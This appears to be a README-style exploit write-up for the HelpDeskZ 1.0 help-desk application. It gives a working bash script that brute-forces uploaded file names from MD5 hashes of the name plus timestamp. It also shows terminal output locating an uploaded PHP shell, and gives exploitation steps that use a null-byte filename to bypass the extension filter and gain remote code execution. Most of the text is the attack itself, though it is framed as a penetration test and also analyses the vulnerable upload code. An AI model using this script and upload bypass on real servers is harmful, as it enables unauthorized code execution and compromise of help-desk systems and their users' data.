# HelpDeskZ
There are vulnerabilties in the [HelpDeskZ application](https://github.com/evolutionscript/HelpDeskZ-1.0/) in which allow an attacker to bypass PHP upload, file extension, restrictions and obtain the world-readable web directory for uploads and hit the uploaded PHP shell, I highly recommend my own [WPES.PHP](https://github.com/weaknetlabs/wpes), for RCE. The code shown below is new and was written after analyzing the HelpDeskZ code for a penetratyion test exercise.
## The Uploads File Enumeration Script
This script will help us find the files aftyer we upload them.
```
#!/bin/bash
# 2019 Douglas Berdeaux - WeakNet Labs, DEMON LINUX
# GNU (C)
# Enumertaion Script - To search for uploaded files to HelpDeskZ
#
URI=""
FILENAME=$1
BASEURL=$2
OFFSET=$3
EXT=$(echo $1|sed -re 's/[^.]+//')
TIME=$(date +%s) # get current time
OFFTIME=$(($TIME + $OFFSET)) # add OFFSET
printf "[*] BaseURL: $BASEURL\n"
printf "[*] Got file: $FILENAME\n"
printf "[*] Got offset of $OFFSET\n"
printf "[*] Using extension: $EXT\n"
printf "[*] Current Epoch Seconds Time (UTC) is $TIME\n"
printf "[*] Adding offset of $OFFSET to $TIME = $OFFTIME\n"
printf "[*] Starting scan, CTRL+C to quit ... \n"
while [ 1 ]; do # just loop through minus 1 for every request until we find it.
 SUM="$FILENAME$OFFTIME"
 MD5=$(echo -n $SUM|md5sum|awk '{print $1}')
 URI="${BASEURL}${MD5}${EXT}"
 printf "[*] Trying: $OFFTIME : $URI"
 RESP=$(curl -s -I $URI|head -n 1| awk '{print $2}')
 if [[ "$RESP" != "404" ]]; then
  printf "\n[!] Possible file name found!\n[!] $URI\n[!] Offset Timestamp: $OFFTIME\n[!] HTTP code: $RESP\n\n";
  exit;
 else
  printf "\r                                                                   \r"
 fi
 OFFTIME=$(($OFFTIME-1)) # try again but subtract 1 from the timestamp.
done;
# no file found :(
printf "[!] Could not determine the file name during the scan.\n"
```
Below is code output from the terminal,
```
root@demon:~/# ./hdz-uploads.sh 'wpes.php' http://(TARGET IP ADDRESS)/helpdeskz/uploads/tickets/ 0
[*] BaseURL: http://(TARGET IP ADDRESS)/helpdeskz/uploads/tickets/
[*] Got file: wpes.php
[*] Got offset of 0
[*] Using extension: .php
[*] Current Epoch Seconds Time (UTC) is 1548108731
[*] Adding offset of 0 to 1548108731 = 1548108731
[*] Starting scan, CTRL+C to quit ... 
[*] Trying: 1548108402 : http://(TARGET IP ADDRESS)/helpdeskz/uploads/tickets/0ae5799a884147422761be35a07e4458.php
[!] Possible file name found!
[!] http://(TARGET IP ADDRESS)/helpdeskz/uploads/tickets/0ae5799a884147422761be35a07e4458.php
[!] Offset Timestamp: 1548108402
[!] HTTP code: 200

```
## Exploitation
The steps to exploitation are as follows,
1. Get the remote server's timestamp. You can use Burp or "Inspect element->Network" and view headers of thr server response in your browser after hitting index.php
2. Find the time difference from your system's clock to the server's date using subtraction
3. create a PHP shell and store it on your FS
4. Get the path to the uploaded files on the target server. This will be ./path/to/helpdeskz/ + /uploads/tickets/ according to the GitHUB repository of HelpDeskZ
5. Hit the "Submit a Ticket" in the target web service's interface and submit a ticket and use BurpSuite to capture the request.
6. Change the file name to "wpes.php%00.jpeg" - this NULL byte is what I used to bypass the PHP file extension filter.
7. Hit "Forward" in BurpSuite until you are taken back to the main page.
8. Run my script - pass the following arguments (as shown in the terminal listing above),
 * The PHP shell file name: wpes.php
 * The URL to the target: http://(TARGET IP ADDRESS)/path/to/helpdeskz/uploads/tickets/ 
 * The time difference between you and the target server: in seconds.
## How this works
First, let's look at the `verifyAttachments()` function in HelpDeskZ. This code comes directly from the author's GitHUB page for HelpDeskZ.
```
function verifyAttachment($filename){
        global $db;
        $namepart = explode('.', $filename['name']);
        $totalparts = count($namepart)-1;
        $file_extension = $namepart[$totalparts];
        if(!ctype_alnum($file_extension)){
                $msg_code = 1;
        }else{
... (SNIPPED) ...
}
```
The above code shows tha the extention itself is used to verify the file type. 

Next, let's look at the upload location. This is the combination of a few files. In `index.php` we have an include of `includes/bootstrap.php`. This PHP code sets up the controllers for the requests. Upon a file attachment submission and the code analyzing the file extension, as we saw above, the following code creates the file on the file system, found in `submit_ticket_controller.php`
```
$ext = pathinfo($_FILES['attachment']['name'], PATHINFO_EXTENSION);
 $filename = md5($_FILES['attachment']['name'].time()).".".$ext;
 $fileuploaded[] = array('name' => $_FILES['attachment']['name'], 'enc' => $filename, 'size' => formatBytes($_FILES['attachment']['size']), 'filetype' => $_FILES['attachment']['type']);
 $uploadedfile = $uploaddir.$filename;
```
This code does the follwoing operations and is what I used to build my script above,

1. Takes the file name, wpes.php, 
2. appends the current timestamp, using PHP's `time()` function
3. creates an MD5 of the enstire string
4. appends the original extension, of `wpes.php` would be '.php'
5. then stores it in `./uploads/tickets/`

This is why the timestamp offset is important. You could technically set it to far in the future and loop through, but this avoids unnecessary excessive HTTP requests during the penetration test.
